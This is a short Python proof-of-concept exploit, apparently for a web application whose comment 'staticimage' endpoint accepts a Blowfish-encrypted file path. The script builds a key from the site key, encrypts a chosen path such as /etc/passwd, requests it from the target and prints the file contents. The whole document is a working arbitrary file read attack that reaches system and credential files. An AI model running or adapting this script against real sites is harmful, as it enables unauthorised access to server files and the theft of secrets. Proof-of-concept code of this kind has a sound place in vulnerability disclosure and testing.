#!/usr/bin/python3
import sys
import requests
from base64 import b64encode, b64decode
from Crypto.Cipher import Blowfish


def decrypt_blowfish(site_key, cipher_text):
    raw = b64decode(b64decode(cipher_text))
    cipher = Blowfish.new(site_key, Blowfish.MODE_ECB)
    return cipher.decrypt(raw)


def encrypt_blowfish(site_key, clear_text):
    cipher = Blowfish.new(site_key, Blowfish.MODE_ECB)
    # PHP Uses a null byte padding 
    bs = Blowfish.block_size
    plen = bs - (len(clear_text) % bs)
    padding = '\x00' * plen
    padded_text = clear_text + padding
    encrytped = cipher.encrypt(padded_text)
    return b64encode(b64encode(encrytped))


if len(sys.argv) < 4:
    print("Not enough args")
    print("Usage: python poc.py sitekey /etc/passwd http://10.2.0.102")
    sys.exit()

site_key = sys.argv[1]
file_path = sys.argv[2]
target_site = sys.argv[3]

# This is super lazy
blowfish_key = "{0}{0}{0}".format(site_key)[:20]

image_b64 = encrypt_blowfish(blowfish_key, file_path).decode('utf-8')
base_url = "{0}/comment/staticimage?image={1}".format(target_site, image_b64)

print("Requesting {0}\n".format(base_url))

response = requests.get(base_url)
print(response.text)